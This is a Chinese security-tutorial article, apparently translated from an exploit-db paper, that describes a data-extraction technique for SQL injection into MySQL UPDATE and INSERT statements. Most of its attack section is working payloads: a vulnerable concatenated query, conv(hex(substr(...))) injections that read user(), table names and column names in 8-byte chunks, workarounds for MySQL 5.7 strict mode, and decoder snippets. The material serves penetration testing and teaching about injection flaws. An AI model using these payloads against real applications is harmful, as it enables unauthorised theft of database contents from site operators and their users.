
# 【技术分享】一种新的MySQL下Update、Insert注入方法


                                阅读量   
                                **239116**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：exploit-db.com
                                <br>原文地址：[https://www.exploit-db.com/docs/41275.pdf](https://www.exploit-db.com/docs/41275.pdf)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p1.ssl.qhimg.com/t01b1716e4413fc281a.png)](https://p1.ssl.qhimg.com/t01b1716e4413fc281a.png)

翻译：[testvul_001](http://bobao.360.cn/member/contribute?uid=780092473)

预估稿费：100RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**前言**

目前我们一般通过报错和时间盲注来对update和insert语句进行SQL注入，下面我们来讲解一种新的获取数据的方法。

首先我们来看一个简单的例子，假设应用会将username字段的结果会返回给我们：

```
$query = "UPDATE users SET username = '$username' WHERE id = '$id';";
```

HTTP应用中的参数是这样的：

```
username=test&amp;id=16
```

我最近研究的带内，带外攻击技巧刚好适用于这个场景，要理解我的技巧，我们可以先看下Mysql 是如何处理字符串的。在Mysql 中一个字符串等于 ‘0’，我们来看一下：

[![](https://p3.ssl.qhimg.com/t01cc281a4e0b2273e5.png)](https://p3.ssl.qhimg.com/t01cc281a4e0b2273e5.png)

假如我们把字符串和数字相加，结果和0 加这个数字一样：

[![](https://p0.ssl.qhimg.com/t01a5d3f314475c813a.png)](https://p0.ssl.qhimg.com/t01a5d3f314475c813a.png)

Mysql的这个属性给了我一些灵感，我们来看看BIGINT的最大值加上一个字符串会怎样？

[![](https://p5.ssl.qhimg.com/t01b604af8353f73320.png)](https://p5.ssl.qhimg.com/t01b604af8353f73320.png)

结果是 ‘1.8446744073709552e19’，这表明字符串实际上作为八字节的DOUBEL类型来处理。

[![](https://p5.ssl.qhimg.com/t0100a4f0da080b0577.png)](https://p5.ssl.qhimg.com/t0100a4f0da080b0577.png)

将一个DOUBLE类型和大数字相加会返回IEEE格式的值，为了解决这个问题我们可以使用OR。

[![](https://p4.ssl.qhimg.com/t0137dca0c4a3280ddb.png)](https://p4.ssl.qhimg.com/t0137dca0c4a3280ddb.png)

现在我们得到了最大的64bit无符号的BIGINT值0xffffffffffffffff。我们需要注意通过OR获取数据时，这个值必须小于BIGINT（不能超过64bit）。

<br>

**转换字符串为数字**

为了获取数据我们可以将应用输出的字段转换为数字，然后再解码回来，如下步骤：

```
String -&gt; Hexadecimal -&gt; Decimal
```

[![](https://p0.ssl.qhimg.com/t010a9008eb233745ae.png)](https://p0.ssl.qhimg.com/t010a9008eb233745ae.png)

通过SQL，Python和Ruby等语言我们可以将数字转回字符串，如下：

```
Decimal -&gt; Hexadecimal -&gt; String
```

[![](https://p5.ssl.qhimg.com/t0162c38655fe29fbab.png)](https://p5.ssl.qhimg.com/t0162c38655fe29fbab.png)

如上面提到的，Mysql中的最大值为BIGINT，我们不能超过它，也就是说每次提取的字符串不能超过8位。

[![](https://p0.ssl.qhimg.com/t01844be893e5213c30.png)](https://p0.ssl.qhimg.com/t01844be893e5213c30.png)

4702111234474983745可以被解码为AAAAAAAA，如果再加一个A,我们就不能正确解码了，因为返回的结果会是无符号的BIGINT值0xffffffffffffffff。

[![](https://p4.ssl.qhimg.com/t0164cc3747191e6a88.png)](https://p4.ssl.qhimg.com/t0164cc3747191e6a88.png)

如果需要获取的数据超过8个字节，我们需要使用substr()方法来将数据分片。

```
select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);
```

n的取值为1、2、3…比如我们要获取的username长度超过8个字符，我们首先获取前八个字符，然后继续获取后面的8个直到得到NULL。

[![](https://p2.ssl.qhimg.com/t0112037d2bc764e2c3.png)](https://p2.ssl.qhimg.com/t0112037d2bc764e2c3.png)

最后我们把user()函数获得的数据解码。

[![](https://p1.ssl.qhimg.com/t01a7a74317de6f00ae.png)](https://p1.ssl.qhimg.com/t01a7a74317de6f00ae.png)

<br>

**注入技巧**

**获取表名**

```
select conv(hex(substr((select table_name from information_schema.tables where table_schema=schema() limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
```

**获取列名**

```
select conv(hex(substr((select column_name from information_schema.columns where table_name=’Name of your table’ limit 0,1),1 + (n-1) * 8, 8*n)), 16, 10);
```

**利用UPDATE语句**

下面我们通过一个例子来说明如何利用更新语句。

[![](https://p0.ssl.qhimg.com/t01a73d6a1edd5b0f4d.png)](https://p0.ssl.qhimg.com/t01a73d6a1edd5b0f4d.png)

实际的查询语句可能是这样的：

[![](https://p0.ssl.qhimg.com/t011d353490f781c9c2.png)](https://p0.ssl.qhimg.com/t011d353490f781c9c2.png)

[![](https://p3.ssl.qhimg.com/t01f035c0c8d3056e1c.png)](https://p3.ssl.qhimg.com/t01f035c0c8d3056e1c.png)

**利用INSERT语句**

原始SQL语句如下：

```
insert into users values (17,'james', 'bond');
```

我们可以像update语句中一样获取数据：

```
insert into users values (17,'james', 'bond'|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);
```



**<br>**

**MySQL 5.7中的限制**

你可能注意到这种方法在MySQL 5.7.5之后的版本并不奏效。

[![](https://p0.ssl.qhimg.com/t01b2d273751c10ecc4.png)](https://p0.ssl.qhimg.com/t01b2d273751c10ecc4.png)

通过研究MySQL 5.7发现Mysql服务器默认运行在‘Strict SQL Mode’下，在MySQL 5.7.5里，默认的模式包含‘STRICT_TRANS_TABLES’。在 ‘Strict SQL Mode’ 下我们不能将integer转换为string。

[![](https://p2.ssl.qhimg.com/t01b58383a4c7198204.png)](https://p2.ssl.qhimg.com/t01b58383a4c7198204.png)

为了解决这个问题，我们需要在注入时一直使用一个integer类型，这样就不会有任何问题了。

[![](https://p2.ssl.qhimg.com/t01c0f333a1564337c4.png)](https://p2.ssl.qhimg.com/t01c0f333a1564337c4.png)

另外任何用户都可以在他的会话里关闭‘Strict Mode’。

[![](https://p0.ssl.qhimg.com/t01b1d78f1a0b9799a9.png)](https://p0.ssl.qhimg.com/t01b1d78f1a0b9799a9.png)

如果想设置影响所有客户端的全局属性需要SUPER权限。

[![](https://p5.ssl.qhimg.com/t01705d4634503b37c6.png)](https://p5.ssl.qhimg.com/t01705d4634503b37c6.png)

开发者也可以使用‘IGNORE’关键字来忽略‘Strict Mode’，如‘INSERT IGNORE’或者‘UPDATE IGNORE’。

[![](https://p1.ssl.qhimg.com/t018bc3ee06bf7f0821.png)](https://p1.ssl.qhimg.com/t018bc3ee06bf7f0821.png)

<br>

**解码Decoding**

SQL

```
select unhex(conv(value, 10, 16));
```

Python

```
dec = lambda x:("%x"%x).decode('hex')
```

Ruby



```
dec = lambda { |x| puts x.to_s(16).scan(/../).map { |x| x.hex.chr }.join }或
dec = lambda { |x| puts x.to_s(16).scan(/w+/).pack("H*") }
```
